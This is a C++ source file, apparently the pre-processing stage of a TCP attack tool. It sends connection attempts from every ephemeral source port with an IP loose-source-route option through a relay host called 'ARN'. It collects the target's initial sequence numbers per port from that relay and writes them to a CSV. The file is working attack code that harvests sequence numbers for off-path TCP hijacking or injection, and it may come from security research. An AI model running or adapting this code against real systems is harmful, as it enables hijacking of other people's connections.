// Linux / POSIX includes
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// C++ STL headers
#include <iostream>
#include <string>
#include <vector>
#include <utility>
#include <cstdint>
#include <fstream>
#include <sstream>
#include <chrono>
#include <thread>

using namespace std;

const char *IP_ADDRESS = "192.0.2.123"; // Replace with desired IP
const int DSTPORT = 80;

// unsigned char ARN_IP_ARRAY[4] = {127, 0, 0, 1}; // Replace with desired ARN IP
unsigned char ARN_IP_ARRAY[4] = {192, 0, 2, 49}; // Replace with desired ARN IP

const char *ARN_IP = "192.0.2.49";
const int ARN_PORT = 9999;
const int TIMEOUT_SECONDS = 60; // Receive for 60 seconds
const char *CSV_NAME = "tcp_attack/pre_processing/ipoptions/ports_isns_ipoptions_linux.csv";

const int BUFSIZE = 1024;
const unsigned char IP_OPTION_EOL = 0;
const unsigned char IP_OPTION_NOP = 1;
const unsigned char IP_OPTION_LSR = 131;
const int TOTAL_PORTS = 65536;
const int START_PORT = 32768;
const int END_PORT = 61000; // exclusive

// Save results to a human-readable CSV file: "port,isn,timestamp_ns".
// Uses "ERROR" for failed ISN and "-1" for missing timestamp.
bool save_results_csv(const vector<pair<uint32_t, long long>> &v, const string &path)
{
    ofstream out(path);
    if (!out)
        return false;
    out << "port,isn,timestamp_ns\n";
    for (size_t i = 0; i < v.size(); ++i)
    {
        out << i << ',';
        uint32_t isn = v[i].first;
        long long ts = v[i].second;
        if (isn == UINT32_MAX)
            out << "ERROR";
        else
            out << isn;
        out << ',';
        if (ts < 0)
            out << "ERROR";
        else
            out << ts;
        out << '\n';
    }
    return out.good();
}

// Load results from CSV produced by save_results_csv. Missing ports will resize the vector.
bool load_results_csv(const string &path, vector<pair<uint32_t, long long>> &out_vec)
{
    ifstream in(path);
    if (!in)
        return false;
    string line;
    // skip header
    if (!getline(in, line))
        return false;
    vector<pair<uint32_t, long long>> tmp;
    while (getline(in, line))
    {
        if (line.empty())
            continue;
        // expect port,isn,timestamp
        stringstream ss(line);
        string portstr, isnstr, tsstr;
        if (!getline(ss, portstr, ','))
            continue;
        if (!getline(ss, isnstr, ','))
            continue;
        if (!getline(ss, tsstr))
            tsstr = "";
        int port = 0;
        try
        {
            port = stoi(portstr);
        }
        catch (...)
        {
            continue;
        }
        uint32_t val = UINT32_MAX;
        long long ts = -1;
        if (isnstr != "ERROR")
        {
            try
            {
                val = static_cast<uint32_t>(stoul(isnstr));
            }
            catch (...)
            {
                val = UINT32_MAX;
            }
        }
        if (!tsstr.empty() && tsstr != "ERROR")
        {
            try
            {
                ts = stoll(tsstr);
            }
            catch (...)
            {
                ts = -1;
            }
        }
        if ((size_t)port >= tmp.size())
            tmp.resize(port + 1, {UINT32_MAX, -1});
        tmp[port] = {val, ts};
    }
    out_vec = std::move(tmp);
    return true;
}

long long get_real_time_ns()
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

void error(const char *msg)
{
    fprintf(stderr, "%s: %s\n", msg, strerror(errno));
    // exit(1);
}

int send_packet_for_source_port(int source_port, vector<pair<uint32_t, long long>> &port_isns)
{
    int sockfd, n;
    struct sockaddr_in serveraddr;

    /* socket: create the socket */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        // error("ERROR opening socket");
        close(sockfd);
        return 1;
    }
    // make it not blocking
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
    // bind source_port
    struct sockaddr_in local_addr;
    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    local_addr.sin_addr.s_addr = INADDR_ANY;
    local_addr.sin_port = htons(source_port);
    if (::bind(sockfd, (struct sockaddr *)&local_addr, sizeof(local_addr)) < 0)
    {
        error("ERROR binding source port");
        close(sockfd);
        return 1;
    }
    printf("Source port %d bound successfully.\n", source_port);
    unsigned char ip_options[12] = {
        IP_OPTION_NOP,
        IP_OPTION_LSR, 7 /*length*/, 4 /*pointer*/, ARN_IP_ARRAY[0], ARN_IP_ARRAY[1], ARN_IP_ARRAY[2], ARN_IP_ARRAY[3],
        IP_OPTION_NOP,
        IP_OPTION_NOP,
        IP_OPTION_NOP,
        IP_OPTION_EOL};

    if (setsockopt(sockfd, IPPROTO_IP, IP_OPTIONS, ip_options, 12) < 0)
    {
        // error("ERROR setting socket options");
        close(sockfd);
        return 1;
    }
    // printf("Socket options set successfully.\n");

    /* Convert IP address string to binary form */
    serveraddr.sin_family = AF_INET;
    if (inet_pton(AF_INET, IP_ADDRESS, &serveraddr.sin_addr) <= 0)
    {
        fprintf(stderr, "ERROR, invalid IP address: %s\n", IP_ADDRESS);
        close(sockfd);
        return 1;
    }
    serveraddr.sin_port = htons(DSTPORT);
    port_isns[source_port] = {UINT32_MAX, get_real_time_ns()}; // Default to error
    if (::connect(sockfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) < 0)
    {
    }
    close(sockfd);
    return 0;
}
void scan(vector<pair<uint32_t, long long>> &port_isns)
{
    for (int port = START_PORT; port < END_PORT; ++port)
    {
        printf("Scanning source port: %d\n", port);
        int res = send_packet_for_source_port(port, port_isns);
        if (res != 0)
        {
            printf("Error scanning port %d\n", port);
        }
        else
        {
            printf("Successfully scanned port %d\n", port);
        }
        this_thread::sleep_for(chrono::milliseconds(1));
    }
}

int connect_to_arn()
{
    int sockfd;
    struct sockaddr_in arn_addr;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        fprintf(stderr, "ERROR opening socket in connect_to_arn: %s\n", strerror(errno));
        return -1;
    }

    // Setup ARN address
    memset(&arn_addr, 0, sizeof(arn_addr));
    arn_addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, ARN_IP, &arn_addr.sin_addr) != 1)
    {
        fprintf(stderr, "ERROR parsing ARN IP %s\n", ARN_IP);
        close(sockfd);
        return -1;
    }
    arn_addr.sin_port = htons(ARN_PORT);

    // Connect to ARN
    printf("Connecting to ARN at %s:%d\n", ARN_IP, ARN_PORT);
    if (::connect(sockfd, (struct sockaddr *)&arn_addr, sizeof(arn_addr)) < 0)
    {
        fprintf(stderr, "ERROR connecting to ARN: %s\n", strerror(errno));
        close(sockfd);
        return -1;
    }

    printf("Connected to ARN.\n");
    return sockfd;
}

string receive_data_with_timeout(int sockfd, int timeout_seconds)
{
    char buf[BUFSIZE];
    int n;
    string accumulated_data;

    // Set socket to non-blocking mode for timeout control
    int flags = fcntl(sockfd, F_GETFL, 0);
    if (flags != -1)
        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

    // Record start time
    auto start_time = chrono::system_clock::now();

    // Keep receiving data until timeout
    printf("Receiving ISN data for %d seconds...\n", timeout_seconds);
    while (true)
    {
        // Check elapsed time
        auto current_time = chrono::system_clock::now();
        auto elapsed = chrono::duration_cast<chrono::seconds>(current_time - start_time).count();
        if (elapsed >= timeout_seconds)
        {
            printf("Timeout reached (%d seconds). Stopping reception.\n", timeout_seconds);
            break;
        }

        // Receive data from ARN
        memset(buf, 0, BUFSIZE);
        n = recv(sockfd, buf, BUFSIZE - 1, 0);

        if (n > 0)
        {
            // Data received
            accumulated_data.append(buf, n);
            printf("Received %d bytes (total: %zu bytes)\n", n, accumulated_data.size());
        }
        else if (n < 0)
        {
            if (errno == EWOULDBLOCK || errno == EAGAIN)
            {
                // No data available, sleep briefly and continue
                usleep(100000); // Sleep 100ms
                continue;
            }
            else
            {
                fprintf(stderr, "ERROR receiving from ARN: %s\n", strerror(errno));
                break;
            }
        }
        else
        {
            // Connection closed
            printf("Connection closed by ARN.\n");
            break;
        }
    }

    printf("Total received: %zu bytes\n", accumulated_data.size());
    return accumulated_data;
}

void parse_isn_data(const string &data, vector<pair<uint32_t, long long>> &port_isns)
{
    // Parse all the received data
    // Assume format is: "port:isn\nport:isn\n..."
    stringstream ss(data);
    string line;
    int parsed_count = 0;

    while (getline(ss, line))
    {
        if (line.empty())
            continue;

        size_t colon_pos = line.find(':');
        if (colon_pos == string::npos)
            continue;

        try
        {
            int port = stoi(line.substr(0, colon_pos));
            uint32_t isn = static_cast<uint32_t>(stoul(line.substr(colon_pos + 1)));

            if (port >= 0 && port < (int)port_isns.size())
            {
                port_isns[port].first = isn;
                parsed_count++;
                if (parsed_count <= 10 || parsed_count % 100 == 0)
                {
                    printf("Updated port %d with ISN %u\n", port, isn);
                }
            }
        }
        catch (...)
        {
            fprintf(stderr, "Failed to parse line: %s\n", line.c_str());
        }
    }

    printf("Parsed %d port:ISN entries.\n", parsed_count);
}

void receives_isn(vector<pair<uint32_t, long long>> &port_isns)
{

    // Connect to ARN server
    int sockfd = connect_to_arn();
    if (sockfd < 0)
    {
        fprintf(stderr, "Failed to connect to ARN server\n");
        return;
    }

    // Receive data with timeout
    string received_data = receive_data_with_timeout(sockfd, TIMEOUT_SECONDS);

    // Parse received data and update port_isns
    parse_isn_data(received_data, port_isns);
    save_results_csv(port_isns, CSV_NAME);
    // Cleanup
    close(sockfd);
    printf("Finished receiving ISN data from ARN.\n");
}

void print(const vector<pair<uint32_t, long long>> &port_isns)
{
    cout << "Scan complete. Non-error results:\n";
    for (int p = START_PORT; p < END_PORT; ++p)
    {
        if (port_isns[p].first != UINT32_MAX)
        {
            cout << "port " << p << " => ISN " << port_isns[p].first << " ts=" << port_isns[p].second << "\n";
        }
    }
}

int main(int argc, char **argv)
{
    auto t1 = std::chrono::high_resolution_clock::now();

    vector<pair<uint32_t, long long>> port_isns(TOTAL_PORTS, {UINT32_MAX, -1});

    // Create threads for scan and receives_isn
    thread receive_thread(receives_isn, ref(port_isns));
    // sleep 3 seconds to allow ARN to be ready
    this_thread::sleep_for(std::chrono::seconds(3));
    thread scan_thread(scan, ref(port_isns));

    // Wait for both threads to complete
    scan_thread.join();
    receive_thread.join();

    auto t2 = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(t2 - t1).count();
    std::cout << "Pre-processing time: " << duration << " seconds" << std::endl;
    return 0;
}
